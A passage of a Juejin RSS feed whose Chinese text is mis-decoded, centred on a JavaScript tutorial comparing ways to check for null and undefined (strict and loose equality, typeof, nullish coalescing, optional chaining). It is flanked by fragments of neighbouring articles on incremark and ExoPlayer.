ğŸ’» <strong>GitHub</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fkingshuaishuai%2Fincremark" target="_blank" title="https://github.com/kingshuaishuai/incremark" ref="nofollow noopener noreferrer">kingshuaishuai/incremark</a>
ğŸ® <strong>åœ¨çº¿æ¼”ç¤º</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fincremark-vue.vercel.app%2F" target="_blank" title="https://incremark-vue.vercel.app/" ref="nofollow noopener noreferrer">Vue</a> | <a href="https://link.juejin.cn?target=https%3A%2F%2Fincremark-react.vercel.app%2F" target="_blank" title="https://incremark-react.vercel.app/" ref="nofollow noopener noreferrer">React</a> | <a href="https://link.juejin.cn?target=https%3A%2F%2Fincremark-svelte.vercel.app%2F" target="_blank" title="https://incremark-svelte.vercel.app/" ref="nofollow noopener noreferrer">Svelte</a></p>
<p>å¦‚æœè¿™ç¯‡æ–‡ç« å¸®ä½ èŠ‚çœäº†è°ƒè¯•æ—¶é—´ï¼Œå» GitHub ç‚¹ä¸ª â­ï¸ å§ã€‚æœ‰é—®é¢˜ï¼Ÿå¼€ä¸ª issue æˆ–è€…åœ¨ä¸‹é¢ç•™è¨€ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JavaScript ä¸­å¦‚ä½•æ­£ç¡®åˆ¤æ–­ null å’Œ undefinedï¼Ÿ]]></title>    <link>https://juejin.cn/post/7592550891538939923</link>    <guid>https://juejin.cn/post/7592550891538939923</guid>    <pubDate>2026-01-08T03:34:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592550891538939923" data-draft-id="7582845425402134568" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JavaScript ä¸­å¦‚ä½•æ­£ç¡®åˆ¤æ–­ null å’Œ undefinedï¼Ÿ"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript"/> <meta itemprop="datePublished" content="2026-01-08T03:34:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¨‹åºå‘˜å¤§å"/> <meta itemprop="url" content="https://juejin.cn/user/3507878440995946"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JavaScript ä¸­å¦‚ä½•æ­£ç¡®åˆ¤æ–­ null å’Œ undefinedï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3507878440995946/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¨‹åºå‘˜å¤§å
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T03:34:44.000Z" title="Thu Jan 08 2026 03:34:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ç›¸ä¿¡å†™å‰ç«¯å¼€å‘çš„æœ‹å‹å¯¹ä¸‹é¢è¿™ç§æŠ¥é”™åº”è¯¥å¾ˆç†Ÿæ‚‰ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">Cannot read properties of undefined
</code></pre>
<p>æœ‰ä¸€æ¬¡æˆ‘åŠ ç­å¤„ç†é—®é¢˜ï¼Œä¹Ÿæ˜¯å› ä¸ºè¿™ä¸€ä¸ªbugã€‚</p>
<p>åæ¥æ‰å‘ç°ï¼ŒåŸæ¥æ˜¯ä¸€ä¸ªæ¥å£è¿”å›çš„æ•°æ®é‡Œï¼ŒæŸä¸ªå­—æ®µæœ‰æ—¶å€™æ˜¯nullå¯¼è‡´çš„ï¼Œè€Œæˆ‘æ²¡æœ‰åšåˆ¤æ–­å°±ç›´æ¥ä½¿ç”¨äº†ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€ä¸ºä»€ä¹ˆéœ€è¦åˆ¤æ–­ç©ºå€¼ï¼Ÿ</h2>
<p>ä¸¾ä¾‹å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// åœºæ™¯1ï¼šç”¨æˆ·æ²¡å¡«å§“å</span>
<span class="hljs-keyword">const</span> userName = <span class="hljs-literal">undefined</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(userName.<span class="hljs-property">length</span>); <span class="hljs-comment">// æŠ¥é”™ï¼Cannot read properties of undefined</span>

<span class="hljs-comment">// åœºæ™¯2ï¼šæ¥å£è¿”å›ç©ºæ•°æ®</span>
<span class="hljs-keyword">const</span> apiResponse = <span class="hljs-literal">null</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(apiResponse.<span class="hljs-property">data</span>); <span class="hljs-comment">// æŠ¥é”™ï¼Cannot read properties of null</span>
</code></pre>
<p>æ‰€ä»¥ï¼Œç©ºå€¼åˆ¤æ–­æ˜¯ä¿è¯ä»£ç å¥å£®æ€§çš„é‡è¦ç¯èŠ‚ã€‚</p>
<hr/>
<h2 data-id="heading-1">äºŒã€å…ˆææ‡‚ï¼šnull å’Œ undefined æœ‰å•¥åŒºåˆ«ï¼Ÿ</h2>
<p>è™½ç„¶å®ƒä»¬éƒ½è¡¨ç¤ºç©ºï¼Œä½†å«ä¹‰ä¸åŒï¼š</p>
<p><strong><code>undefined</code></strong>ï¼šå˜é‡è¢«å£°æ˜äº†ï¼Œä½†è¿˜æ²¡èµ‹å€¼ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> name;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(name); <span class="hljs-comment">// undefined</span>
</code></pre>
<p><strong><code>null</code></strong>ï¼šç¨‹åºå‘˜ä¸»åŠ¨èµ‹å€¼ä¸ºç©ºï¼Œè¡¨ç¤ºæˆ‘æ˜ç¡®çŸ¥é“è¿™é‡Œæ²¡æœ‰å€¼ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> user = <span class="hljs-literal">null</span>; <span class="hljs-comment">// è¡¨ç¤ºâ€œç”¨æˆ·ä¸å­˜åœ¨â€</span>
</code></pre>
<p>æ‰€ä»¥ï¼Œå½“æˆ‘ä»¬è¯´åˆ¤æ–­å˜é‡æ˜¯å¦ä¸ºç©ºï¼Œé€šå¸¸æ˜¯æŒ‡ï¼šå®ƒæ˜¯ä¸æ˜¯ <code>null</code> æˆ– <code>undefined</code>ã€‚</p>
<hr/>
<h2 data-id="heading-2">åˆ¤æ–­æ–¹æ³•</h2>
<p>ä»¥ä¸‹ä»‹ç»äº†æ¯”è¾ƒå¸¸ç”¨çš„å‡ ç§åˆ¤æ–­æ–¹æ¡ˆã€‚</p>
<h3 data-id="heading-3">æ–¹æ³•ä¸€ï¼šæ˜¾å¼æ¯”è¾ƒï¼ˆæœ€ä¿é™©ï¼‰</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">if</span> (variable === <span class="hljs-literal">null</span> || variable === <span class="hljs-literal">undefined</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å˜é‡ä¸ºç©º'</span>);
}
</code></pre>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼š</p>
<ul>
<li>éœ€è¦æ˜ç¡®åŒºåˆ†nullå’Œundefinedæ—¶</li>
<li>å›¢é˜Ÿä»£ç è§„èŒƒè¦æ±‚ä¸¥æ ¼ç›¸ç­‰åˆ¤æ–­</li>
<li>å¯¹ä»£ç å¯è¯»æ€§è¦æ±‚é«˜çš„é¡¹ç›®</li>
</ul>
<p><strong>æ¡ˆä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">getUserProfile</span>(<span class="hljs-params">user</span>) {
  <span class="hljs-keyword">if</span> (user === <span class="hljs-literal">null</span> || user === <span class="hljs-literal">undefined</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-string">'ç”¨æˆ·ä¸å­˜åœ¨'</span>;
  }
  <span class="hljs-keyword">return</span> <span class="hljs-string">`æ¬¢è¿ï¼Œ<span class="hljs-subst">${user.name}</span>`</span>;
}
</code></pre>
<hr/>
<h3 data-id="heading-4">æ–¹æ³•äºŒï¼šéä¸¥æ ¼ç›¸ç­‰ï¼ˆæœ€å¸¸ç”¨ï¼‰</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">if</span> (variable == <span class="hljs-literal">null</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å˜é‡ä¸ºç©º'</span>);
}
</code></pre>
<p>è¿™é‡Œæœ‰ä¸ª<strong>é‡è¦çŸ¥è¯†ç‚¹</strong>ï¼š<code>== null</code> å®é™…ä¸Šç­‰ä»·äº <code>=== null || === undefined</code>ï¼Œè¿™æ˜¯JavaScriptçš„è¯­è¨€ç‰¹æ€§ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆæ¨èè¿™ä¸ªå†™æ³•ï¼Ÿ</strong></p>
<ul>
<li>ä»£ç ç®€æ´ï¼Œå°‘å†™å¾ˆå¤šå­—ç¬¦</li>
<li>æ€§èƒ½ä¼˜ç§€ï¼Œç°ä»£JSå¼•æ“éƒ½åšäº†ä¼˜åŒ–</li>
<li>æ„å›¾æ˜ç¡®ï¼Œä¸“ä¸šå¼€å‘è€…ä¸€çœ‹å°±æ‡‚</li>
</ul>
<hr/>
<h3 data-id="heading-5">æ–¹æ³•ä¸‰ï¼šé€»è¾‘éæ“ä½œç¬¦</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">if</span> (!variable) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å˜é‡ä¸ºfalsyå€¼'</span>);
}
</code></pre>
<p><strong>æ³¨æ„ï¼</strong> è¿™ä¸ªæ–¹æ³•å®¹æ˜“é€ æˆå…¶å®ƒçš„è¯¯ä¼¤ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// è¿™äº›å€¼éƒ½ä¼šè¢«åˆ¤æ–­ä¸º"ç©º"</span>
!<span class="hljs-literal">false</span>      <span class="hljs-comment">// true</span>
!<span class="hljs-number">0</span>         <span class="hljs-comment">// true  </span>
!<span class="hljs-string">""</span>        <span class="hljs-comment">// true</span>
!<span class="hljs-title class_">NaN</span>       <span class="hljs-comment">// true</span>

<span class="hljs-comment">// å®é™…å¼€å‘ä¸­çš„å‘</span>
<span class="hljs-keyword">const</span> count = <span class="hljs-number">0</span>;
<span class="hljs-keyword">if</span> (!count) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'è®¡æ•°ä¸º0'</span>); <span class="hljs-comment">// è¿™é‡Œä¼šæ‰§è¡Œï¼Œä½†å¯èƒ½ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„</span>
}
</code></pre>
<hr/>
<h3 data-id="heading-6">æ–¹æ³•å››ï¼štypeof å…³é”®å­—ï¼ˆå®‰å…¨çš„å†™æ³•ï¼‰</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> variable === <span class="hljs-string">'undefined'</span> || variable === <span class="hljs-literal">null</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å˜é‡æ˜¯ç©ºçš„ï¼'</span>);
}
</code></pre>
<p>å®‰å…¨åœ¨å“ªï¼Ÿ</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// å¦‚æœå˜é‡æ ¹æœ¬æ²¡å£°æ˜ï¼Œå‰ä¸¤ç§æ–¹æ³•ä¼šæŠ¥é”™</span>
<span class="hljs-keyword">if</span> (notDeclaredVariable == <span class="hljs-literal">null</span>) { <span class="hljs-comment">// æŠ¥é”™ï¼ReferenceError</span>
}

<span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> notDeclaredVariable === <span class="hljs-string">'undefined'</span>) { <span class="hljs-comment">// æ­£å¸¸è¿è¡Œï¼</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å˜é‡æœªå®šä¹‰'</span>);
}
</code></pre>
<p>è¿™ç§å†™æ³•ä¸»è¦ç”¨äºæ£€æŸ¥ä¸€ä¸ªå˜é‡æ˜¯å¦è¢«å£°æ˜è¿‡ï¼Œä½†å¯¹äºæ™®é€šå‡½æ•°å‚æ•°æˆ–å·²å£°æ˜å˜é‡ï¼Œæ²¡å¿…è¦è¿™ä¹ˆå¤æ‚ã€‚</p>
<p>é€‚ç”¨äºä¸ç¡®å®šå˜é‡æ˜¯å¦å£°æ˜çš„åœºæ™¯ã€‚</p>
<hr/>
<h3 data-id="heading-7">æ–¹æ³•äº”ï¼šç©ºå€¼åˆå¹¶æ“ä½œç¬¦ï¼ˆç°ä»£å†™æ³•ï¼‰</h3>
<p>è¿™æ˜¯ES2020çš„æ–°ç‰¹æ€§ï¼Œç”¨èµ·æ¥ç‰¹åˆ«é¡ºæ‰‹ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä¼ ç»Ÿå†™æ³•</span>
<span class="hljs-keyword">const</span> name = username ? username : <span class="hljs-string">'åŒ¿åç”¨æˆ·'</span>;

<span class="hljs-comment">// ç°ä»£å†™æ³•</span>
<span class="hljs-keyword">const</span> name = username ?? <span class="hljs-string">'åŒ¿åç”¨æˆ·'</span>;
</code></pre>
<p><strong>ä¼˜åŠ¿</strong>ï¼šåªå¯¹ <code>null</code> å’Œ <code>undefined</code> ç”Ÿæ•ˆï¼Œä¸ä¼šè¯¯åˆ¤0ã€falseç­‰å…¶ä»–å€¼ã€‚</p>
<hr/>
<h3 data-id="heading-8">æ–¹æ³•å…­ï¼šå¯é€‰é“¾æ“ä½œç¬¦ï¼ˆå¯¹è±¡å±æ€§ä¸“ç”¨ï¼‰</h3>
<p>å¤„ç†åµŒå¥—å¯¹è±¡æ—¶ï¼Œè¿™ä¸ªåŠŸèƒ½ç®€ç›´æ˜¯æ•‘å‘½ç¨»è‰ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä»¥å‰çš„ç—›è‹¦å†™æ³•</span>
<span class="hljs-keyword">const</span> street = user &amp;&amp; user.<span class="hljs-property">address</span> &amp;&amp; user.<span class="hljs-property">address</span>.<span class="hljs-property">street</span>;

<span class="hljs-comment">// ç°åœ¨çš„ä¼˜é›…å†™æ³•</span>
<span class="hljs-keyword">const</span> street = user?.<span class="hljs-property">address</span>?.<span class="hljs-property">street</span>;
</code></pre>
<p>ç»“åˆç©ºå€¼åˆå¹¶ï¼Œå†™æ³•æ›´åŠ å®‰å…¨ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> street = user?.<span class="hljs-property">address</span>?.<span class="hljs-property">street</span> ?? <span class="hljs-string">'åœ°å€æœªçŸ¥'</span>;
</code></pre>
<hr/>
<h2 data-id="heading-9">å®é™…å¼€å‘ä¸­çš„å»ºè®®</h2>
<h3 data-id="heading-10">åœºæ™¯1ï¼šç®€å•çš„ç©ºå€¼æ£€æŸ¥</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æ¨è</span>
<span class="hljs-keyword">if</span> (value == <span class="hljs-literal">null</span>) {
  <span class="hljs-comment">// å¤„ç†ç©ºå€¼</span>
}

<span class="hljs-comment">// æˆ–è€…</span>
<span class="hljs-keyword">const</span> safeValue = value ?? defaultValue;
</code></pre>
<h3 data-id="heading-11">åœºæ™¯2ï¼šéœ€è¦åŒºåˆ†nullå’Œundefined</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">if</span> (value === <span class="hljs-literal">null</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ˜ç¡®è®¾ç½®ä¸ºç©º'</span>);
}

<span class="hljs-keyword">if</span> (value === <span class="hljs-literal">undefined</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æœªå®šä¹‰'</span>);
}
</code></pre>
<h3 data-id="heading-12">åœºæ™¯3ï¼šå¤„ç†å¯¹è±¡å±æ€§</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å®‰å…¨è®¿é—®æ·±å±‚å±æ€§</span>
<span class="hljs-keyword">const</span> phone = order?.<span class="hljs-property">customer</span>?.<span class="hljs-property">contact</span>?.<span class="hljs-property">phone</span> ?? <span class="hljs-string">'æœªå¡«å†™'</span>;
</code></pre>
<h3 data-id="heading-13">åœºæ™¯4ï¼šå‡½æ•°å‚æ•°é»˜è®¤å€¼</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">createUser</span>(<span class="hljs-params">name, age = <span class="hljs-number">18</span></span>) {
  <span class="hljs-comment">// ageå‚æ•°åªåœ¨undefinedæ—¶ä½¿ç”¨é»˜è®¤å€¼</span>
  <span class="hljs-keyword">return</span> { name, age };
}
</code></pre>
<hr/>
<h2 data-id="heading-14">æ€»ç»“</h2>
<p>è™½ç„¶ç°ä»£JavaScriptå¼•æ“ä¼˜åŒ–å¾—å¾ˆå¥½ï¼Œä½†äº†è§£åŸç†è¿˜æ˜¯æœ‰å¸®åŠ©çš„ï¼š</p>
<ol>
<li><code>== null</code> å’Œæ˜¾å¼æ¯”è¾ƒæ€§èƒ½ç›¸å½“</li>
<li><code>typeof</code> æ£€æŸ¥ç¨æ…¢ï¼Œä½†èƒ½å®‰å…¨æ£€æµ‹æœªå£°æ˜å˜é‡</li>
<li>å¯é€‰é“¾æ“ä½œç¬¦åœ¨ç°ä»£æµè§ˆå™¨ä¸­æ€§èƒ½ä¼˜ç§€</li>
</ol>





































<table><thead><tr><th>åœºæ™¯</th><th>æ¨èå†™æ³•</th><th>åŸå› </th></tr></thead><tbody><tr><td>ä¸€èˆ¬ç©ºå€¼æ£€æŸ¥</td><td><code>value == null</code></td><td>ç®€æ´é«˜æ•ˆ</td></tr><tr><td>éœ€è¦æ˜ç¡®æ„å›¾</td><td><code>value === null</code></td><td/><td>value === undefined`</td><td>å¯è¯»æ€§å¼º</td></tr><tr><td>è®¾ç½®é»˜è®¤å€¼</td><td><code>value ?? defaultValue</code></td><td>å®‰å…¨å‡†ç¡®</td></tr><tr><td>å¯¹è±¡å±æ€§è®¿é—®</td><td><code>obj?.prop</code></td><td>é¿å…æŠ¥é”™</td></tr><tr><td>å‡½æ•°å‚æ•°</td><td>å‚æ•°é»˜è®¤å€¼</td><td>è¯­è¨€ç‰¹æ€§</td></tr></tbody></table>
<p>æ²¡æœ‰ç»å¯¹æœ€å¥½çš„æ–¹æ³•ï¼Œåªæœ‰æœ€é€‚åˆå½“å‰åœºæ™¯çš„é€‰æ‹©ã€‚æ ¹æ®ä½ çš„å…·ä½“éœ€æ±‚å’Œå›¢é˜Ÿè§„èŒƒæ¥å†³ç­–å§ï¼</p>
<blockquote>
<p>æœ¬æ–‡é¦–å‘äºå…¬ä¼—å·ï¼šç¨‹åºå‘˜å¤§åï¼Œä¸“æ³¨åˆ†äº«å‰åç«¯å¼€å‘çš„å®æˆ˜ç¬”è®°ã€‚å…³æ³¨æˆ‘ï¼Œå°‘èµ°å¼¯è·¯ï¼Œä¸€èµ·è¿›æ­¥ï¼</p>
</blockquote>
<h4 data-id="heading-15">ğŸ“Œå¾€æœŸç²¾å½©</h4>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F63yNglRRfo7hJ3F3e8tZLA" target="_blank" title="https://mp.weixin.qq.com/s/63yNglRRfo7hJ3F3e8tZLA" ref="nofollow noopener noreferrer">16 ä¸ªå‰ç«¯å†·çŸ¥è¯†ï¼šç”¨ä¸€æ¬¡å°±å¿˜ä¸æ‰çš„é‚£ç§</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FF4JkmYxUs9RAtsti6V1uhg" target="_blank" title="https://mp.weixin.qq.com/s/F4JkmYxUs9RAtsti6V1uhg" ref="nofollow noopener noreferrer">æˆ‘ä¹Ÿæ˜¯å†™äº†å¾ˆä¹… TypeScriptï¼Œæ‰æ„è¯†åˆ°è¿™äº›å†™æ³•ä¸å¯¹</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F2wHCiqgtRfK_008fLBamPQ" target="_blank" title="https://mp.weixin.qq.com/s/2wHCiqgtRfK_008fLBamPQ" ref="nofollow noopener noreferrer">ThreadLocal åœ¨å®é™…é¡¹ç›®ä¸­çš„ 6 å¤§ç”¨æ³•ï¼ŒåŸæ¥å¯ä»¥è¿™ä¹ˆç®€å•</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FsMAKhSLNvmU1ddxg0yv9Fg" target="_blank" title="https://mp.weixin.qq.com/s/sMAKhSLNvmU1ddxg0yv9Fg" ref="nofollow noopener noreferrer">é‡æ„äº†20ä¸ªSpringBooté¡¹ç›®åï¼Œæ€»ç»“å‡ºè¿™å¥—ç¨³å®šé«˜æ•ˆçš„æ¶æ„è®¾è®¡</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ExoPlayer MediaCodecè§†é¢‘è§£ç Bufferæ¨¡å¼GPUæ¸²æŸ“åŠ é€Ÿ]]></title>    <link>https://juejin.cn/post/7592559120118513710</link>    <guid>https://juejin.cn/post/7592559120118513710</guid>    <pubDate>2026-01-08T03:42:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592559120118513710" data-draft-id="7583403164579463210" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ExoPlayer MediaCodecè§†é¢‘è§£ç Bufferæ¨¡å¼GPUæ¸²æŸ“åŠ é€Ÿ"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-08T03:42:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ—¶å…‰å°‘å¹´"/> <meta itemprop="url" content="https://juejin.cn/user/923245500710296"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ExoPlayer MediaCodecè§†é¢‘è§£ç Bufferæ¨¡å¼GPUæ¸²æŸ“åŠ é€Ÿ
